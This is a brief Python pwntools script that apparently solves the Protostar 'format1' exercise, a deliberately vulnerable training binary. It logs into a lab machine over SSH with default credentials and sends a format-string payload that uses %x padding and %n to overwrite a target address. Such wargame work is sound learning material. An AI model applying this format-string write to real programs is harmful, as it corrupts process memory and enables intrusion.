#!/usr/bin/python3
from pwn import *
# you may need to change port for your machine
session = ssh(host='172.16.17.27', user='user', password='user', port=22)
# we find the target on the stack and modify it using %n
io = session.run('bash', env={"PS1":""})
if(io):
    # the target is at address 0x08049638 from objdump -t ./format1
    # we pass this address with a bunch of %x's until we find
    # it on the stack. Then we replace the last %x with %n to write to
    # the area in memory
    s = './format1 \"`python -c \"print \'AAAA\'+\'\\x38\\x96\\x04\\x08\'+\'BBBBB\'+\'%x \'*128+\'%n \'\"`\"'
    io.sendline('cd /opt/protostar/bin')
    io.sendline(s)
    print(s)
    log.info(io.recvuntil(b')').decode('utf-8'))
else:
    print("Error running sh")
session.close()
